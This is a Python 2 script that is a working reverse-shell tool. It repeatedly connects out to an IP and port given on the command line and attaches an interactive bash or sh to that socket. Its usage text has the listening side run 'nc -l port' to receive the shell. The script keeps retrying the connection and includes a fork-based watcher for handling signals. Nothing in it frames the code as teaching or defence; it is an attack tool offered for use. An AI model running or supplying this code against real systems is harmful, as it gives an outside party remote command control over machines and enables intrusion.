#!/usr/bin/env python
#coding: utf-8
import socket
import os
import subprocess
import threading
import sys
import errno
import time
import signal


def getshell():
    sh = '/bin/sh'
    bash = '/bin/bash'
    if os.path.exists(bash):
        return [bash, "-i"]
    else:
        return [sh, "-i"]


class ReverseShell(threading.Thread):
    def __init__(self, sock):
        super(ReverseShell, self).__init__()
        self.daemon = False
        self.sock = sock

    def run(self):
        os.dup2(self.sock.fileno(), 0)
        os.dup2(self.sock.fileno(), 1)
        os.dup2(self.sock.fileno(), 2)
        subprocess.call(getshell())


class MonitorThread(threading.Thread):
    def __init__(self, target, port):
        super(MonitorThread, self).__init__()
        self.daemon = False
        self.target = target
        self.port = port

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            try:
                sock.connect((self.target, self.port))
            except:
                pass
            else:
                Shell = ReverseShell(sock)
                Shell.start()
                Shell.join()
                sock.close()
            time.sleep(0.1)


class Watcher:   
    """this class solves two problems with multithreaded  
    programs in Python, (1) a signal might be delivered  
    to any thread (which is just a malfeature) and (2) if  
    the thread that gets the signal is waiting, the signal  
    is ignored (which is a bug).  
 
    The watcher is a concurrent process (not thread) that  
    waits for a signal and the process that contains the  
    threads.  See Appendix A of The Little Book of Semaphores.  
    http://greenteapress.com/semaphores/  
 
    I have only tested this on Linux.  I would expect it to  
    work on the Macintosh and not work on Windows.  
    """  
  
    def __init__(self):   
        """ Creates a child thread, which returns.  The parent  
            thread waits for a KeyboardInterrupt and then kills  
            the child thread.  
        """  
        self.child = os.fork()   
        if self.child == 0:   
            return  
        else:   
            self.watch()
            
    def watch(self):   
        try:   
            os.wait()   
        except (KeyboardInterrupt, SystemExit):   
            # I put the capital B in KeyBoardInterrupt so I can   
            # tell when the Watcher gets the SIGINT
            print "server exit at %s" % time.asctime()
            self.kill()   
        sys.exit()   
  
    def kill(self):   
        try:   
            os.kill(self.child, signal.SIGKILL)   
        except OSError: pass 


def usage():
    print """
    Usage: %s target_ip port
    In target machine, use command "nc -l port" to get shell.
    """ % (os.path.realpath(__file__))


if __name__ == '__main__':
    try:
        target = sys.argv[1]
        port = sys.argv[2]
    except IndexError, e:
        usage()
        sys.exit(1)
        if len(sys.argv) <= 1:
            usage()
            sys.exit(1)
    Watcher()
    Monitor = MonitorThread(target, int(port))
    Monitor.start()

